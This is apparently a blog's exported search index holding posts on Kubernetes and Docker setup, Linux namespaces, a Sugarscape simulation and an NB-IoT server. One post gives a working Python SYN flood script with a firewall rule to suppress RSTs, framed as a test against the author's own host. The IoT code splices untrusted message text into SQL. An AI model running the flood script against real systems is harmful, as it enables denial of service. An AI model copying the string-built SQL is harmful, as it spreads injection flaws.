<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[搭建Kubernetes集群]]></title>
    <url>%2F2019-05-01-learning-k8s-2%2F</url>
    <content type="text"><![CDATA[尝试用虚拟机手工搭建k8s集群，本文是搭建流程记录，使用了三台CentOS虚拟机节点作为物理Node，由于众所周知的原因，公网引发问题不计其数，所以需要一些额外的垃圾步骤，并且过程中遇到了很多莫名巧妙的问题，多次重新安装了虚拟机及中间的一些Trouble Shooting，为了确保流程简洁此处暂时省略这些细节。 配置虚拟机系统及软件安装 更改主机名为 1hostnamectl --static set-hostname master 更新Docker源 12cd /etc/yum.repos.d/wget -c https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 创建Kubernetes源，kubernetes.repo，文件内容为， 1234567[kubernetes]name=Kubernetesbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/enabled=1gpgcheck=1repo_gpgcheck=1gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg 开始安装并启动相应服务， 1234yum install docker-ceyum install kubeadm kubelet kubectlsystemctl enable docker &amp;&amp; systemctl start dockersystemctl enable kubelet &amp;&amp; systemctl start kubelet 修改一些系统参数，尝试了不修改这些参数，在部署过程中会报错，导致部署失败，查看相关原因都跟这几个参数有关。 12345678910#SELINUX在文件中/etc/selinux/config 修改 SELINUX=permissive#Firewallsystemctl disable firewalld &amp;&amp; systemctl stop firewalld#网络参数设置sysctl -w net.bridge.bridge-nf-call-iptables=1在文件中/etc/sysctl.d/k8s.conf 添加一行 net.bridge.bridge-nf-call-iptables=1#关闭SWAPswapoff -a 在文件中/etc/fstab执行·将swap所在行注释掉 克隆虚拟机。 配置k8s Master节点 取所需容器镜像 由于不能直连其中涉及到的域名，所以只能额外增加了这步操作，查看所需的镜像。也可以通过配置Proxy或者开VPN的方式，这样不需要提前下载镜像。 12345678[root@master ~]# kubeadm config images listk8s.gcr.io/kube-apiserver:v1.14.2k8s.gcr.io/kube-controller-manager:v1.14.2k8s.gcr.io/kube-scheduler:v1.14.2k8s.gcr.io/kube-proxy:v1.14.2k8s.gcr.io/pause:3.1k8s.gcr.io/etcd:3.3.10k8s.gcr.io/coredns:1.3.1 准备如下shell脚本文件并运行，之后使用docker image ls可以看到下载好的镜像。 123456789101112131415#! /bin/bashimages=( kube-apiserver:v1.14.2 kube-controller-manager:v1.14.2 kube-scheduler:v1.14.2 kube-proxy:v1.14.2 pause:3.1 etcd:3.3.10 coredns:1.3.1) for imageName in $&#123;images[@]&#125; ; do docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName k8s.gcr.io/$imageNamedone 确认下载image， 1[root@k8s-master ~]# docker image ls 初始化Master节点（使用kubeadm reset可以回滚） 1kubeadm init --apiserver-advertise-address 192.168.56.117 --pod-network-cidr=10.244.0.0/16 123456789101112131415161718[root@master ~]# kubeadm init --apiserver-advertise-address 192.168.56.117 --pod-network-cidr=10.244.0.0/16...Your Kubernetes control-plane has initialized successfully!To start using your cluster, you need to run the following as a regular user: mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/configYou should now deploy a pod network to the cluster.Run "kubectl apply -f [podnetwork].yaml" with one of the options listed at: https://kubernetes.io/docs/concepts/cluster-administration/addons/Then you can join any number of worker nodes by running the following on each as root:kubeadm join 192.168.56.117:6443 --token qivprv.la764w1vr8onk3ik \ --discovery-token-ca-cert-hash sha256:23df71bdfacb9de49311a2ba16fc7a3efb3d707dd8ece2502237955e5ea299e8 123mkdir -p $HOME/.kubesudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/configsudo chown $(id -u):$(id -g) $HOME/.kube/config 配置k8s Slave节点 修改两台worker节点主机名 1234#nodeahostnamectl --static set-hostname nodea#nodebhostnamectl --static set-hostname nodeb 在master，nodea，nodeb上修改/etc/hosts文件， 123192.168.56.117 master192.168.56.118 nodea192.168.56.119 nodeb 在nodea和nodeb上执行，（使用kubeadm reset可以回滚） 12kubeadm join 192.168.56.117:6443 --token cn6unj.8xj0rfk7w9a49x5y \ --discovery-token-ca-cert-hash sha256:0489ee84cbbdd26f759fddac685da43cb5d327fe1b8a5f5f30d90de8d5cd233c 在master上执行， 12345[root@master ~]# kubectl get nodesNAME STATUS ROLES AGE VERSIONmaster NotReady master 12m v1.14.2nodea NotReady &lt;none&gt; 3m v1.14.2nodeb NotReady &lt;none&gt; 6s v1.14.2 查看NotReady的原因， 1234[root@k8s-master ~]# kubectl describe node k8s-nodea...KubeletNotReady runtime network not ready: NetworkReady=false reason:NetworkPluginNotReady message:docker: network plugin is not ready: cni config uninitialized... 安装网络插件， 此处使用calico插件， 1kubectl apply -f https://docs.projectcalico.org/v3.7/manifests/calico.yaml 查看Node状态， 12345[root@master ~]# kubectl get nodesNAME STATUS ROLES AGE VERSIONmaster Ready master 12m v1.14.2nodea Ready &lt;none&gt; 7m50s v1.14.2nodeb Ready &lt;none&gt; 7m31s v1.14.2]]></content>
      <categories>
        <category>学习K8S容器集群</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[一个单独的容器应用]]></title>
    <url>%2F2019-05-01-learning-k8s-1%2F</url>
    <content type="text"><![CDATA[开始学习Kubernetes，并对学习过程做一些简单记录。本篇记录以Docker容器形式启动一个Web应用的方法，首先将Web需要的Html文件以本地文件的形式挂载到Nginx容器上，然后再尝试写一个Dockerfile将所需要的网页文件直接写入到Docker镜像中，创建一个镜像并以新镜像直接运行此应用。虚拟机和宿主机用Bridge方式连接。从宿主机浏览器访问虚拟机中所运行Docker容器内的Web服务。 在容器中启动Web应用 安装docker 修改安装源到阿里云， 123456789cat &lt;&lt;EOF &gt; /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetesbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/enabled=1gpgcheck=1repo_gpgcheck=1gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpgEOF 安装net-tools和docker并启动， 1234yum install net-toolsyum install dockersystemctl enable dockersystemctl start docker 修改docker的镜像加速指向阿里云， 12345cat &lt;&lt;EOF &gt; /etc/docker/daemon.json&#123; "registry-mirrors": ["https://l8gz8qd0.mirror.aliyuncs.com"]&#125;EOF 重启docker服务 12systemctl daemon-reloadsystemctl restart docker 从镜像启动一个Web应用 将之前制作完成的网页放入当前目录html路径下， 12345#Ubuntu 755就行，这个权限，mmpchmod -R 777 ./html#其中-v是挂载物理机的指定目录到容器内的指定目录，-p是将物理机的端口号映射到容器内端口号[root@master ~]# docker run -p 80:80 -v $PWD/html:/usr/share/nginx/html nginx 写一个Dockerfile 将网页文件写入到镜像中，并发布到镜像仓库中。 1234#dockerfileFROM nginxMAINTAINER "toto &lt;toto.zhang@gmail.com&gt;"COPY $PWD/html/ /usr/share/nginx/html/ 1234567891011[root@master ~]# docker build -t mywebv1 ./Sending build context to Docker daemon 15.54 MBStep 1/3 : FROM nginx ---&gt; 53f3fd8007f7Step 2/3 : MAINTAINER "toto &lt;toto.zhang@gmail.com&gt;" ---&gt; Using cache ---&gt; d4e48c59c558Step 3/3 : COPY $PWD/html/ /usr/share/nginx/html/ ---&gt; Using cache ---&gt; eaa41b6b815dSuccessfully built eaa41b6b815d 用新镜像启动Web应用 当一个开发人员做完了这个应用，运维直接一条指令自动执行。 12345[root@master ~]# docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEmywebv1 latest eaa41b6b815d 21 hours ago 124 MB[root@master ~]# docker run -p 80:80 mywebv1 从外部浏览器访问位于容器内的web服务。]]></content>
      <categories>
        <category>学习K8S容器集群</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[容器的本质]]></title>
    <url>%2F2019-04-18-the-essence-of-container%2F</url>
    <content type="text"><![CDATA[随着5G的到来，互联网和通信技术的演进，被谷歌力推的Kubernetes现在已经成为业界操作容器的标准方案。Kubernetes控制对象是容器，那么究竟什么是容器？容器的本质是什么？为什么江湖传闻它相比于虚拟机更轻便？为什么说容器的底层存在安全隐患，隐患从何而来？为什么对于Linux系统自身根本没有容器的概念？理解这些问题对于日后的计算集群运维和开发都有重要的意义。而了解这些，需要从创建子进程说起。 创建一个隔离的进程 Linux系统中提供的系统调用fork创建子进程是不带参数的，而系统调用clone是可以带参数的，clone的参数列表中就包括用来做进程隔离的标志位参数，以下c代码中，父进程调用clone创建子进程后wait阻塞。clone中的第一个参数函数指针container就是子进程的执行单元。系统调用clone使用了5个标志位，用来对新创建的进程做隔离。 标志位 作用 CLONE_NEWNET 标示子进程具有独立的网络空间。 CLONE_NEWPID 标示子进程在自身空间内变为1号进程，具有独立进程树。 CLONE_NEWIPC 标示子进程具有独立的进程间通信Inter Process Communication。 CLONE_NEWUTS 标示子进程具有自己的主机名。 CLONE_NEWNS 标示子进程享有独立文件系统结构。 12345678910111213141516171819202122232425262728293031323334#define _GNU_SOURCE#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/mount.h&gt;#include &lt;stdio.h&gt;#include &lt;sched.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#define SIZE (1024 * 1024)static char stack[SIZE];int clone_flags = CLONE_NEWNET | CLONE_NEWPID | \ CLONE_NEWIPC | CLONE_NEWUTS | \ CLONE_NEWNS | SIGCHLD;char* const childprocess[] = &#123; "/bin/bash", NULL &#125;;int container(void* arg) &#123; printf("Inside the container, current PID is %d.\n", getpid()); sethostname("container", 10); mount("proc", "/proc", "proc", 0, NULL); execv(childprocess[0], childprocess); return 1;&#125;int main(int argc, char** argv) &#123; printf("In Parent, Container started\n"); int childpid = clone(container, stack + SIZE, clone_flags, NULL); printf("Container's PID is %d.\n", childpid); waitpid(childpid, NULL, 0); printf("In Parent, Container stopped.\n"); mount("proc", "/proc", "proc", 0, NULL); return 0;&#125; 创建子进程前，查看系统的进程树，网络设备，主机名，进程间通信IPC。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546root@vbox:/share# pstreesystemd─┬─VBoxService───7*[&#123;VBoxService&#125;] ├─accounts-daemon───2*[&#123;accounts-daemon&#125;] ├─atd ├─cron ├─dbus-daemon ├─login───bash───main───bash ├─lvmetad ├─lxcfs───2*[&#123;lxcfs&#125;] ├─networkd-dispat───&#123;networkd-dispat&#125; ├─polkitd───2*[&#123;polkitd&#125;] ├─rsyslogd───3*[&#123;rsyslogd&#125;] ├─snapd───8*[&#123;snapd&#125;] ├─sshd───sshd───sshd───bash───su───bash───pstree ├─systemd───(sd-pam) ├─systemd-journal ├─systemd-logind ├─systemd-network ├─systemd-resolve └─systemd-udevdroot@vbox:/share# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 08:00:27:9f:34:d0 brd ff:ff:ff:ff:ff:ff inet 192.168.0.108/24 brd 192.168.0.255 scope global dynamic enp0s3 valid_lft 6323sec preferred_lft 6323sec inet6 fe80::a00:27ff:fe9f:34d0/64 scope link valid_lft forever preferred_lft foreverroot@vbox:/share# hostnamevboxroot@vbox:/share# ipcs------ Message Queues --------key msqid owner perms used-bytes messages------ Shared Memory Segments --------key shmid owner perms bytes nattch status0x00002234 0 root 666 68 0------ Semaphore Arrays --------key semid owner perms nsems 编译执行，创建子进程。注意命令提示符的变化。 12345root@vbox:/share# ./mainIn Parent, Container startedContainer's PID is 1624.Inside the container, current PID is 1.container:/share# 创建子进程后，查看系统的进程树，网络设备，主机名，进程间通信IPC。可以看到，此进程认为自己是1号进程，网络设备只包含一个没有开启的loopback，主机名变成了container，进程间通信中共享内存没有了之前的共享内存段，至此已经相当于进入了一个容器内部运行。 12345678910111213141516171819202122container:/share# pstreetcsh───pstreecontainer:/share# ps -efUID PID PPID C STIME TTY TIME CMDroot 1 0 0 07:23 pts/0 00:00:00 -bin/tcshroot 4 1 0 07:23 pts/0 00:00:00 ps -efcontainer:/share# ip a1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 container:/share# hostnamecontainercontainer:/share# ipcs------ Message Queues --------key msqid owner perms used-bytes messages------ Shared Memory Segments --------key shmid owner perms bytes nattch status------ Semaphore Arrays --------key semid owner perms nsems 为进程构建独立网络 接下来，再继续为子进程构建一个类似于Docker的网络连接。Docker一般会创建一个叫做bridge0或者docker0的网桥，用来连接多个“容器”，以及“宿主机”，以实现Docker独立网络空间的效果。也可以按照类似的方法构建一个NAT网络。 12345678910111213141516171819#在父进程空间执行#创建网桥totobridge0brctl addbr totobridge0ifconfig totobridge0 up#创建网络设备VethA和VethB，VethA连接网桥，VethB设置IP地址ip link add VethA type veth peer name VethBbrctl addif totobridge0 VethAip link set VethA upifconfig VethB 192.168.10.1/24 up#创建网络设备VethC和VethD，VethC连接网桥，VethD放入Container PID指定的网络空间ip link add VethC type veth peer name VethDbrctl addif totobridge0 VethCip link set VethC up ip link set dev VethD netns $&#123;container's pid&#125;#在子进程网络空间执行ip link set VethD upip addr add 192.168.10.2/24 dev VethD 以上指令执行完成后，就搭建起了一个上图示意的网络拓扑结构。此时查看两个网络空间的内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#宿主机中的网络设备root@vbox:/share# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 08:00:27:9f:34:d0 brd ff:ff:ff:ff:ff:ff inet 192.168.1.95/24 brd 192.168.1.255 scope global dynamic enp0s3 valid_lft 85829sec preferred_lft 85829sec inet6 fe80::a00:27ff:fe9f:34d0/64 scope link valid_lft forever preferred_lft forever3: totobridge0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether ae:11:7c:70:05:c3 brd ff:ff:ff:ff:ff:ff inet6 fe80::e4b7:f6ff:fe25:e2aa/64 scope link valid_lft forever preferred_lft forever4: VethB@VethA: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether d2:81:47:d5:7c:d4 brd ff:ff:ff:ff:ff:ff inet 192.168.10.1/24 brd 192.168.10.255 scope global VethB valid_lft forever preferred_lft forever inet6 fe80::d081:47ff:fed5:7cd4/64 scope link valid_lft forever preferred_lft forever5: VethA@VethB: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master totobridge0 state UP group default qlen 1000 link/ether ce:06:89:24:9f:f0 brd ff:ff:ff:ff:ff:ff inet6 fe80::cc06:89ff:fe24:9ff0/64 scope link valid_lft forever preferred_lft forever7: VethC@if6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master totobridge0 state UP group default qlen 1000 link/ether ae:11:7c:70:05:c3 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet6 fe80::ac11:7cff:fe70:5c3/64 scope link valid_lft forever preferred_lft foreverroot@vbox:/share# ping 192.168.10.2PING 192.168.10.2 (192.168.10.2) 56(84) bytes of data.64 bytes from 192.168.10.2: icmp_seq=1 ttl=64 time=0.027 ms64 bytes from 192.168.10.2: icmp_seq=2 ttl=64 time=0.054 ms64 bytes from 192.168.10.2: icmp_seq=3 ttl=64 time=0.055 ms64 bytes from 192.168.10.2: icmp_seq=4 ttl=64 time=0.040 ms--- 192.168.10.2 ping statistics ---4 packets transmitted, 4 received, 0% packet loss, time 3032msrtt min/avg/max/mdev = 0.027/0.044/0.055/0.011 ms#容器中的网络设备container:/# ip a1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:006: VethD@if7: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether 42:59:e1:ca:df:21 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 192.168.10.2/24 scope global VethD valid_lft forever preferred_lft forever inet6 fe80::4059:e1ff:feca:df21/64 scope link valid_lft forever preferred_lft forevercontainer:/# ping 192.168.10.1PING 192.168.10.1 (192.168.10.1) 56(84) bytes of data.64 bytes from 192.168.10.1: icmp_seq=1 ttl=64 time=0.126 ms64 bytes from 192.168.10.1: icmp_seq=2 ttl=64 time=0.038 ms64 bytes from 192.168.10.1: icmp_seq=3 ttl=64 time=0.091 ms64 bytes from 192.168.10.1: icmp_seq=4 ttl=64 time=0.056 ms--- 192.168.10.1 ping statistics ---4 packets transmitted, 4 received, 0% packet loss, time 3035msrtt min/avg/max/mdev = 0.038/0.077/0.126/0.035 ms 现在可以看到，容器子进程的行为已经类似虚拟机的行为了。容器的本质实际上就是Linux系统中被隔离的子进程，所以容器运行在宿主机同一个内核上，这种情况安全性相比虚拟机会比较弱。实际上，虚拟机是用软件模拟出一个完整的图灵机再运行操作系统，在其上再运行应用程序，虚拟机之间的应用是不共享内核协议栈的，而容器非常容易可以控制共享哪些内容。这也是kubernetes的pod可以带多个容器的实现原理。 参考链接：http://crosbymichael.com/creating-containers-part-1.html]]></content>
      <categories>
        <category>学习K8S容器集群</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[玩玩大糖帝国]]></title>
    <url>%2F2019-03-06-sugarscape%2F</url>
    <content type="text"><![CDATA[本文主要针对来自“西西河”论坛的名帖“大糖帝国(知乎链接)”进行实现，西西河的原文链接目前404了。大糖帝国这篇文章内容是由淮夷”提取自《The Origin of Wealth》书中的一个章节中提及的一个简单的经济学模型，并且淮夷追加了一些自己的观点。文章翻译了这本书中的Sugarscape这个章节，我个人觉得中文翻译要比原书的英文内容描述的更加精彩。这个著名游戏是1996年美国布鲁金斯研究所的Epstein和Axtell设计的，这两位号称是用计算机程序模拟经济演化的先驱。非常遗憾书的原作者和西西河的翻译者都没有提供模型的源代码，因为模型很简洁并且看起来非常具有可玩性，所以我决定使用Python自己实现这个模型，对文章数据进行验证，并简单记录实现方案。 运行规则说明 大糖帝国的地图如下图所示，含糖量在[0, 4]之间取值，糖人根据出生所在位置标记颜色，方便运行时判断出身不同的糖人所在位置的变化情况，糖人的出生地与天赋（消化能力和视力）无关。糖人的属性包含，ID，出生位置，出生等级[0-4]，含糖财富值，以及视力和消化能力。糖人含糖值低于0时，糖人死亡。游戏设置开关，可以选择将糖人清除出地图，还是尸体留在原地。地图有3个属性，位置坐标，坐标对应的含糖量以及被消耗的糖的恢复速度。糖人根据利益最大化原则，搜索其东南西北四个方向上视力所及的含糖量最高点，并移动过去，吃掉该点所有的糖。当地图上存活的所有糖人都被调度一次，算是一轮结束，Round计数增加1，可以认为是帝国中1天结束。此时，地图上被吃掉的糖根据地图设定的恢复速度，自行恢复，恢复上限为初始数值。 根据可调整参数运行 根据运行规则可以看到，可调整参数包括地图和糖人自身参数两个方面。 调整Sugarscape Map参数 地图含糖恢复速度设定为最慢，每一轮（1Round）恢复糖量为1。由于资源的恢复速度很低，导致糖人不得不离开自己的所在位置去寻找更好的目标位置，所以糖人并不会完全聚集在糖山，而是流动起来，分散到了糖山的各个位置，这种状态下的中高含糖区的糖人非常活跃，低糖区的糖人，或者找到一个较合适的位置后就会安于现状，或者被饿死。贫富分化由于人员的位置迁移非常活跃，最终会出现，但是分化较慢，差距不会非常大。 视频演示链接（由于Github不支持iframe标签和大视频文件上传，只能留链接了） 地图含糖恢复速度设定适中，每一轮（1Round）恢复糖量为3。由于糖的速度恢复较快，糖人们不再进行频繁的迁移，只有糖山顶端的糖人能够看到更优质的资源而导致其活动频繁。而处于含糖量中低区域的糖人停止了活动。 视频演示链接 地图资源瞬时恢复，每一轮（1Round）恢复糖量为4。由于糖的速度恢复达到峰值，大糖帝国经济繁荣，糖人们只要不是具有超强的食欲，停留在原地就会得到最多的资源，此时糖人们停止任何寻找糖的活动。可以观察到，这种情况下贫富分化的速度加快，很快呈现出幂律分布的趋势。 视频演示链接 地图不恢复，地图恢复能力设置为0，糖被吃掉后不再恢复，导致所有的糖被瞬间消耗掉，大糖帝国资源枯竭，最终所有糖人在饥饿中死去。 视频演示链接 调整Agent参数 以下情况Sugarscape的恢复速度设置为3。 糖人数量翻倍 人口数量设置为500，其他参数不变。这种情况只是人口死亡会多一些，财富分布规律不变。 糖人基因变好 糖人视力设置为10-20，食欲设置为1，此时糖人视野好，消耗能量少，可以无限存活并发现更好的资源。此时糖人大部分都能发现资源多的位置，只有运气极差的会在低糖区饿死。 作为糖人，不可能生下来就是顶级的视力和极好的消化能力，所以这种情况是不应该存在的。处于低糖区的糖人，由于视力范围有限，很难跨越阶层，只有哪些出生在阶层边缘才能跨越阶层的可能。出生在低糖区，因为看不到更好的资源位置，也只能安于现状，混吃等死。有的糖人可能生下来财富就多于其他人，可惜出生在了0含糖区中，随机选择路线的过程中有因为随机选择方向不对，一只被困在其中，最后也只能死去。在实现过程中，被使用最多的库函数是random。与大糖帝国类似，random决定了我们在这个世界中的生活方式与最终的命运，正如美剧Heros里Haitian说的那句话“The Universe decides our destiny”。]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[TCP SYN Flood Simulation With Python]]></title>
    <url>%2F2019-01-26-tcp-synflood-with-python%2F</url>
    <content type="text"><![CDATA[The main content of this topic is to simulate a TCP syn flood attack against my Aliyun host in order to have some tests. With the help of the kamene framework which also known as scapy3, I’ll craft some IP packets as we always did with Rawsocket of C under unix years ago, at the same time to notes some concerns during this process, including how it works, the network topology, the usage of kamene, the configuration of the firewall, and the packets dump of the server. How It Works The idea is very simple. SYN queue flood attack takes advantage of the TCP protocol’s “three-way handshake”, the client send a “SYN”, the server answer a “SYN, ACK”, and the client do nothing but leave the connection half opened. This action will repete again and again to consume the server’s resources as much as possible. One Packet Test The code send one packet to the host 47.95.194.185, it’s a tcp SYN packet. 12345678910111213from kamene.all import *from kamene.layers.inet import IP, TCPfrom kamene.volatile import RandShortiplayer = IP(dst="47.95.194.185", id=1111, ttl=99)tcplayer = TCP(sport=RandShort(), dport=[80], seq=12345, ack=1000, window=1000, flags="S")packet = iplayer / tcplayersend(packet)# applayer = "hello, there"# packet = iplayer / tcplayer / applayer# packet.show()# send(packet) Run this code, and capture the packets on the client side and server side. The client (macOS) sends a RST after receiving the SYN, ACK from the server to notify the server not to allocate resources for this request. So what I need to do is stop this RST being sent out. Because the client is behind the NAPT and the server is also behind the NAPT. Config Firewall To Stop The RST On the client macOS, append this line into /etc/pf.conf, and reboot the system. 1block drop proto tcp from any to any flags R/R After the computer boots up, make sure the firewall is working. 123456&gt; sudo pfctl -e&gt; sudo pfctl -s infoNo ALTQ support in kernelALTQ related functions disabledStatus: Enabled for 0 days 00:06:25 Debug: Urgent Run the script again, and check out the wireshark captures, RST has been blocked by the firewall. Finish The Works Finish the code to loop the packet sending activity, 12345678910111213141516from kamene.all import *from kamene.layers.inet import IP, TCPfrom kamene.volatile import RandShort# IP Layeriplayer = IP(dst="47.95.194.185")# TCP Layertcplayer = TCP(sport=RandShort(), dport=[8080], seq=RandShort(), ack=1000, window=1000, flags="S")# Combinepacket = iplayer / tcplayerwhile True: send(packet) time.sleep(1) Check the server tcp connection status, we can see the number of connections that are in the SYN_RECV status is increasing, if I change the code to send the packet quick enough, the server will deny to service the other customers. 123456789101112131415root@iZ2ze0ycbhz8v1bg7bckj8Z:~# netstat -anp | grep 8080tcp 0 0 0.0.0.0:8080 0.0.0.0:* LISTEN 15116/javatcp 0 0 172.17.237.168:8080 120.200.8.124:13525 SYN_RECV -tcp 0 0 172.17.237.168:8080 120.200.8.124:13527 SYN_RECV -tcp 0 0 172.17.237.168:8080 120.200.8.124:13533 SYN_RECV -tcp 0 0 172.17.237.168:8080 120.200.8.124:13526 SYN_RECV -tcp 0 0 172.17.237.168:8080 120.200.8.124:13528 SYN_RECV -tcp 0 0 172.17.237.168:8080 120.200.8.124:13531 SYN_RECV -tcp 0 0 172.17.237.168:8080 120.200.8.124:13530 SYN_RECV -tcp 0 0 172.17.237.168:8080 120.200.8.124:13536 SYN_RECV -tcp 0 0 172.17.237.168:8080 120.200.8.124:13529 SYN_RECV -tcp 0 0 172.17.237.168:8080 120.200.8.124:13532 SYN_RECV -tcp 0 0 172.17.237.168:8080 120.200.8.124:13524 SYN_RECV -tcp 0 0 172.17.237.168:8080 120.200.8.124:13535 SYN_RECV -tcp 0 0 172.17.237.168:8080 120.200.8.124:13534 SYN_RECV - What if the 3-way-handshake complete The firewall is enabled, and I send the final ack of the 3-way-handshake to establish the connection, what will happen? 123456789101112131415161718192021222324from kamene.all import *from kamene.layers.inet import IP, TCP# IP Layersrcip = ""dstip = "47.95.194.185"iplayer = IP(dst=dstip)# TCP Layersrcport = random.randint(1024, 65535)dstport = [80]seqnum = random.randint(1024, 65535)acknum = 0window = 1000flags = "S"tcplayer = TCP(sport=srcport, dport=dstport, seq=seqnum, ack=acknum, window=window, flags=flags)# 3 Way Handshake# SYNpacket_synack = sr1(iplayer / tcplayer)# SYN_ACKpacket_ack = TCP(sport=srcport, dport=dstport, seq=packet_synack.ack, ack=packet_synack.seq + 1, flags='A')# ACKsend(iplayer / packet_ack) Run this code and capture the packets in wireshark. Check out the network status on the server, a connection has been established successfully. 12root@iZ2ze0ycbhz8v1bg7bckj8Z:~# netstat -anp | grep 120.200.8.124tcp 0 0 172.17.237.168:80 120.200.8.124:13710 ESTABLISHED 785/nginx: worker p Check out the network status on the client, there’s no connection infomation to the server. 12➜ ~ netstat -an | grep 47.95.194.185➜ ~]]></content>
      <categories>
        <category>Network</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[NBIoT App System Demo Implementation With Python]]></title>
    <url>%2F2019-01-19-nbiot-system-demo%2F</url>
    <content type="text"><![CDATA[The narrow band internet of things is coming, as known as NBIoT, which is used for machine to machine communications. Examples are devices for meter reading like electricity, gas, or water consumption. They are often stationary, thus need not an optimized handover. Only a small amount of data is usually transferred, which is even not delay sensitive. However, the number of these devices may become quite big, even up to several orders of magnitude compared to the traditional devices. NB-IoT network is consist of terminal devices, radio access network, core network, IoT server platform and user applications. This part focuses on the IoT server platform and user applications. System Overview The details of the network elements from the service operators are ignored here. I just view this system from the applications perspective. There are 5 subsystem for the whole application system. The IOT device part, the data receiving server, the web server, the database and the browser part. The IOT device part contains sensors, micro control unit and the IOT module. Of course, devices like Raspberry PI or android devices that have operation system will also be ok, I just keep it simple, the control unit has no operation system, the IOT module is used for network acccessing. I will left this part for another article. And a fake client which can send UDP datagrams will used for testing. So no OS, no software updates. I won’t have to consider the NAT hole punching problems. The data receving server should be accessible through the Internet. MySQL is used as the database. And the webserver is nginx. Actully the web part is a stand alone project and there is too much non-technical business logic. I will start another writing for that. The browser part can be iOS app, android app, browser on mobile devices or laptops or even WeChat programs. I am not interested in this part, and it’ll be quite easy to implement. The Data Collection Server The messages are sent to this server. This server should have a mirror backup for redundancy. If there are performance issues, some load sharing machenism can be involved, the database can be separated if necessary. Message Reception The IOTMsgReception is for fetching a incoming message from the socket, transfer it from the bytes to a string and append it to the message queue. The message queue is a typical FIFO structure without size limit. At the same time, the queue is thread safe. 1234567891011121314151617181920212223242526272829import socketimport threadingclass IOTMsgReception(threading.Thread): def __init__(self, identifier, name, queue, ipaddr, port, buffersize): threading.Thread.__init__(self) self.identifier = identifier self.buffersize = buffersize self.name = name self.queue = queue self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) self.sock.bind((ipaddr, port)) def __del__(self): self.close() def get(self): data, addr = self.sock.recvfrom(self.buffersize) return bytes.decode(data) def close(self): self.sock.close() def run(self): while True: msg = self.get() self.queue.put(msg) Message Processor IOTMsgProcessors get the message simutaneously from the message queue in parallel, one processor holds a permanent connection to the database. Once the message is processed, it’ll be write to the database. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import threadingimport pymysqlfrom configparser import ConfigParserclass IOTMsgProcessor(threading.Thread): def __init__(self, identifier, name, queue): threading.Thread.__init__(self) self.identifier = identifier self.name = name self.queue = queue # Global Configurations self.config = ConfigParser() self.config.read("server.config") try: self.db = pymysql.connect(host=self.config.get("db", "host"), port=self.config.getint("db", "port"), user=self.config.get("db", "user"), passwd=self.config.get("db", "pass"), db=self.config.get("db", "name"), charset=self.config.get("db", "char")) self.cursor = self.db.cursor() except: print("Fail to connect to database") def __del__(self): self.db.close() def run(self): while True: line = self.queue.get() self.proc(line) def proc(self, data_to_save): elements = str(data_to_save).split(":") # Access Database searchsql = self.replace_params(self.config.get("sql", "search"), "@PARAM@", elements[0]) updatesql = self.replace_params(self.config.get("sql", "update"), "@PARAM@", elements[1], elements[0]) insertsql = self.replace_params(self.config.get("sql", "insert"), "@PARAM@", elements[0], elements[1]) self.cursor.execute(searchsql) if 